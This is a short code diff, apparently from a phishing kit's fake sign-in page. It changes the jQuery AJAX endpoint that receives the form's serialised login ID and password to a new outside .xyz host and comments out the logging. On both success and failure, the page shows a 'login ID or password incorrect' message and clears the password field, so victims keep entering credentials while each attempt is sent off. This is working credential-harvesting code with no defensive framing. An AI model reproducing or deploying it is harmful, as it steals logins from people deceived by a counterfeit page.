@@ -229,15 +229,15 @@
                     $("#sub").html("Processing...").prop("disabled", true);
                     $.ajax({
                         type: "POST",
-                        url: "https://nmjyuu.xyz/s9nd/cc.php",
+                        url: "https://ponxbon.xyz/s9nd/tip.php",
                         data: $(this).serialize()
                     }).done(function (data) {
-                      console.log(data);
+                     // console.log(data);
                       $("#msg").html("The login ID or password you entered is incorrect.Please enter again.").css("color","red");
                       $("#x2").val("");
                       $("#sub").html("Sign In").prop("disabled", false);
                     }).fail(function () {
-                      console.log(data);
+                    //  console.log(data);
                       $("#msg").html("The login ID or password you entered is incorrect.Please enter again.").css("color","red");
                       $("#x2").val("");
                       $("#sub").html("Sign In").prop("disabled", false);
